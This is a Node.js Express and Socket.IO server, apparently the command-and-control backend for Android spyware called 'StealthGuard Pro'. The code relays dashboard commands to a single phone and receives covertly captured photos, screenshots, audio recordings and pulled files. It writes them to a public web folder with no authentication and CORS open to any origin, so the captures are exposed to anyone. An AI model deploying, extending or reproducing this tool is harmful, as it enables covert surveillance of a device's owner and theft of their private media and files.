const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8,
    pingTimeout: 60000,
    pingInterval: 25000
});

let androidSocket = null;
let webSocket = null;

// Keep-alive route for UptimeRobot
app.get('/ping', (req, res) => res.send('pong'));

io.on('connection', (socket) => {
    const isWeb = socket.handshake.query.type === 'web';

    if (isWeb) {
        webSocket = socket;
        console.log(`[+] Web Dashboard Connected`);
        if (androidSocket) {
            webSocket.emit('device_status', { connected: true });
            androidSocket.emit('remote_command', { action: 'ping' }); // Wake up check
        }

        socket.on('gui_command', (data) => {
            if (androidSocket && androidSocket.connected) {
                console.log(`[CMD] Sending ${data.action} to Android`);
                androidSocket.emit('remote_command', data);
            } else {
                socket.emit('server_log', "Error: Android Device Offline!");
            }
        });

    } else {
        // Android Connection
        if (androidSocket) {
            console.log("[!] Replacing old Android socket with new one");
            androidSocket.disconnect();
        }

        androidSocket = socket;
        console.log(`[+] ANDROID DEVICE CONNECTED: ${socket.id}`);
        if (webSocket) webSocket.emit('device_status', { connected: true });

        socket.onAny((event, data) => {
            if (webSocket) webSocket.emit(event, data);
        });

        socket.on('child_photo_taken', (data) => {
            try {
                const buffer = Buffer.from(data.image, 'base64');
                fs.writeFileSync('public/captured_photo.jpg', buffer);
                if (webSocket) webSocket.emit('child_photo_taken', { success: true });
            } catch (e) { console.error("Save error:", e); }
        });

        socket.on('child_screenshot', (data) => {
            try {
                const buffer = Buffer.from(data.image, 'base64');
                fs.writeFileSync('public/captured_screenshot.jpg', buffer);
                if (webSocket) webSocket.emit('child_screenshot_taken', { success: true });
            } catch (e) { console.error("Screenshot save error:", e); }
        });

        socket.on('file_data', (data) => {
            try {
                if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
                const buffer = Buffer.from(data.file_data, 'base64');
                const safeName = data.file_name.replace(/[^a-z0-9.]/gi, '_');
                fs.writeFileSync(`public/downloads/${safeName}`, buffer);
                if (webSocket) webSocket.emit('download_ready', { name: data.file_name });
            } catch (e) { console.error("Download error:", e); }
        });

        socket.on('child_audio_recorded', (data) => {
            try {
                if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
                const buffer = Buffer.from(data.audio, 'base64');
                const fileName = `recording_${Date.now()}.mp3`;
                fs.writeFileSync(`public/downloads/${fileName}`, buffer);
                if (webSocket) webSocket.emit('audio_ready', { url: `/downloads/${fileName}`, name: fileName });
            } catch (e) { console.error("Audio save error:", e); }
        });
    }

    socket.on('disconnect', () => {
        if (socket === webSocket) {
            console.log("[-] Web Dashboard Disconnected");
            webSocket = null;
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\nSTEALTHGUARD PRO SERVER ACTIVE`);
    console.log(`URL: https://my-stealth-guard.onrender.com`);
    console.log(`PORT: ${PORT}\n`);
});
